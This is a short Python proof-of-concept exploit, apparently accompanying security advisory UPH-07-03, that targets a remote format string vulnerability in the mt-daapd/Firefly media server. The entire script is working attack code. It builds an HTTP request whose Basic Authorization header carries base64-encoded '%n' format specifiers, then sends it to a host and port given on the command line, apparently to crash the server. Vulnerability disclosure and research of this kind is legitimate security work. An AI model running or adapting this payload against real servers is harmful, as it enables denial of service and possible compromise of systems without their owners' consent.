#!C:\python25\python25.exe

"""
Advisory : [UPH-07-03]
mt-dappd/Firefly media server remote format string vulnerability
Discovered by nnp
http://www.unprotectedhex.com
"""

import sys
import socket
import base64

if len(sys.argv) != 3:
    sys.exit(-1)

fmt_str = base64.b64encode("%n"*16 + ":" + "password")
kill_msg = "GET /xml-rpc?method=stats HTTP/1.1\r\nAuthorization: Basic " \
           + fmt_str + "\r\n\r\n"

host = sys.argv[1]
port = sys.argv[2]

print '[+] Host : ' + host
print '[+] Port : ' + port

print "[+] Sending "
print kill_msg

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, int(port)))
s.send(kill_msg)
s.close()
